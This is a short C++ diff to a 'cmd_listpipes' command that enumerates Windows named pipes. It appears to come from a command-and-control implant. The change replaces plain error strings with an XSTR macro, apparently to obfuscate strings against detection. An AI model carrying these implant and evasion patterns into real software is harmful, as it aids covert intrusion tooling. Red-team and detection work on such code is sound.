@@ -21,7 +21,7 @@ auto declfn starburst::cmd_listpipes(
     HANDLE h_find = inst.kernel32.FindFirstFileW( pipe_path, &fd );
     if ( h_find == INVALID_HANDLE_VALUE ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "FindFirstFileW on pipe namespace failed" ) ) );
+            XSTR( "FindFirstFileW on pipe namespace failed" ) );
         return;
     }
 
@@ -30,7 +30,7 @@ auto declfn starburst::cmd_listpipes(
     if ( !output ) {
         inst.kernel32.FindClose( h_find );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
     uint32_t off = 0;
